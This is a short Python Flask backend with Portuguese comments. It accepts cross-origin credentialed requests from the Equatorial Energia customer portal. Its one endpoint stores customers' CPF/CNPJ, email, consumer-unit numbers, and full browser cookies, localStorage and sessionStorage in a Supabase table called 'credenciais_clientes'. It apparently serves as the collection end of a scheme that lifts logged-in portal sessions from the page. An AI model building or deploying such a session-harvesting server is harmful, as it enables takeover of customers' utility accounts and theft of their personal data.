import os 
from flask import Flask, request, jsonify
from flask_cors import CORS
from supabase import create_client, Client

# Criação da aplicação Flask
app = Flask(__name__)

# Configuração do CORS
CORS(app, 
     origins="https://pi.equatorialenergia.com.br",
     supports_credentials=True,
     allow_headers=["Content-Type", "Authorization"],
     methods=["GET", "POST", "OPTIONS"])

@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', 'https://pi.equatorialenergia.com.br')
    response.headers.add('Access-Control-Allow-Credentials', 'true')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
    response.headers.add('Access-Control-Allow-Methods', 'GET,POST,OPTIONS')
    return response

# Conexão com o Supabase
SUPABASE_URL = os.environ.get("SUPABASE_URL")
SUPABASE_KEY = os.environ.get("SUPABASE_KEY")
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

@app.route('/salvar-sessao', methods=['POST'])
def salvar_sessao():
    data = request.get_json()

    if not data:
        return jsonify({'erro': 'JSON inválido'}), 400

    try:
        insert_data = {
            'cnpj_cpf': data.get('cpf'),
            'email_data': data.get('email_data', ''),
            'estado': data.get('estado', ''),
            'ucs': data.get('uc', []),
            'tipo': data.get('tipo'),
            'distribuidora': data.get('distribuidora'),
            'cookies': data.get('cookies'),
            'local_storage': data.get('localStorage'),
            'session_storage': data.get('sessionStorage'),
            'ativo': False
        }

        result = supabase.table('credenciais_clientes').insert(insert_data).execute()

        # ✅ Verificação mais confiável
        if result.data:
            return jsonify({'mensagem': 'Sessão salva no Supabase!', 'dados': result.data}), 200
        else:
            return jsonify({'erro': 'Erro ao salvar no Supabase', 'detalhes': str(result)}), 500

    except Exception as e:
        return jsonify({'erro': str(e)}), 500


@app.route("/check", methods=["GET"])
def check():
    return jsonify({"status": "OK"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
